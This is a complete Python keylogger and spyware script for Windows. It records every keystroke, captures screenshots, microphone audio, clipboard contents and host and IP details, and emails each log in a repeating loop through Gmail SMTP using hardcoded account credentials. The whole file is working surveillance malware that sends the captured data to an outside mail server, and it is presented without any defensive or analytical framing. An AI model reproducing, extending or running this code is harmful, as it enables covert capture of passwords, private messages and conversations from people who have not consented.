import smtplib
import base64
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
import sounddevice
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
import socket
import platform
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import win32clipboard
import time

# files for each function

clipboardLogs = "clipboardLogs.txt"
screenshotLogs = "screenshotLogs.png"
audioLogs = "audioLogs.wav"
keyLogs = "keyLogs.txt"
systemLogs = "systemLogs.txt"

# parent_directory = str(os.getcwd() + "\\")
parent_directory = str("D:\\Workspace" + "\\")


def system_info():
    sysFile = open(os.path.join(parent_directory,systemLogs), "w")
    try:
        publicIp = get("https://api.ipify.org").text
    except:
        publicIp = "not able to retrieve"
    hostSystemName = socket.gethostname()
    privateIp = socket.gethostbyname(hostSystemName)

    sysFile.write(f"System Host Name            : {hostSystemName}\n")
    sysFile.write(f"System private IP address   : {privateIp}\n")
    sysFile.write(f"System public IP address    : {publicIp}\n")
    sysFile.write(f"System Machine and Processor: {platform.system()} \\ {platform.processor()}\n")
    sysFile.close()

def audio_recording():
    lengthOfRecording = 20
    samplerate = 44100
    try:
        recording = sounddevice.rec(int(lengthOfRecording * samplerate), samplerate=samplerate, channels=2)  # start recording
        sounddevice.wait() # wait for recording to be finished
        write(os.path.join(parent_directory + audioLogs), samplerate, recording)     # write the numpy array as WAV file
    except:
        pass

# everything copy pasted will be stored in a file
def clipboard_info():
    savedData = ""
    try:
        win32clipboard.OpenClipboard()
        savedData = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
    except:
        pass

    if(savedData):
        clipboardFile = open(os.path.join(parent_directory,clipboardLogs), "w")
        clipboardFile.write(savedData)
        clipboardFile.close()
        savedData = ""
    else:
        pass

def screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(os.path.join(parent_directory, screenshotLogs))
    except:
        pass

def key_press(key):

    if(os.path.isfile(os.path.join(parent_directory,keyLogs))):
        keyFile = open(os.path.join(parent_directory,keyLogs), "a")
    else:
        keyFile = open(os.path.join(parent_directory,keyLogs), "w")

    if hasattr(key, 'char'):  # if key is a char write as it is
        keyFile.write(key.char)
    elif key == Key.space:  # If key is space, print an actual space
        keyFile.write(' ')
    elif key == Key.enter:  # If key is enter, go to a new line
        keyFile.write('\n')
    elif key == Key.tab:  # If key is tab, print an actual tab
        keyFile.write('\t')
    else:  # In case of any other key pressed, write it between "[]" 
        keyFile.write('[' + key.name + ']')
    keyFile.close()

def key_release(key):
    if key == Key.esc:
        return False

def key_listener():
    with Listener(on_press=key_press, on_release=key_release) as listener:
        listener.join()

def email_protocol(fileType,fileData):

    senderEmailAddress     = "dispacct100@gmail.com"
    senderEmailPassword    = "junk@@@@@"
    receipientEmailAddress = "dispacct100@gmail.com"

    try:
        msg = MIMEMultipart()
        msg['From'] = senderEmailAddress
        msg['To'] = receipientEmailAddress
        msg['Subject'] = f"{fileType} File"
        body = "A new attachment has arrived"
        msg.attach(MIMEText(body))
        attachedFile = open(fileData, 'rb')
        payload = MIMEBase('application', 'octet-stream')
        payload.set_payload((attachedFile).read())
        encoders.encode_base64(payload)
        payload.add_header('Content-Disposition', "attachment; filename= %s" % fileType)
        msg.attach(payload)
        smtp = smtplib.SMTP('smtp.gmail.com', 587)
        smtp.starttls()
        smtp.login(senderEmailAddress, senderEmailPassword)
        text = msg.as_string()
        smtp.sendmail(senderEmailAddress, receipientEmailAddress, text)
        smtp.quit()
    except:
        pass

def transfer_data():
    system_info()
    email_protocol(systemLogs, os.path.join(parent_directory + systemLogs))
    while(True):
        email_protocol(keyLogs, os.path.join(parent_directory + keyLogs))
        print("email 1 sent")
        time.sleep(10)
        screenshot()
        email_protocol(screenshotLogs, os.path.join(parent_directory + screenshotLogs))
        print("email 2 sent")
        time.sleep(10)
        audio_recording()
        email_protocol(audioLogs, os.path.join(parent_directory + audioLogs))
        print("email 3 sent")
        time.sleep(10)
        clipboard_info()
        email_protocol(clipboardLogs, os.path.join(parent_directory + clipboardLogs))
        time.sleep(10)

if __name__=='__main__':
    freeze_support()
    p1 = Process(target = key_listener)
    p1.start()
    p2 = Process(target = transfer_data)
    p2.start()


# testing emails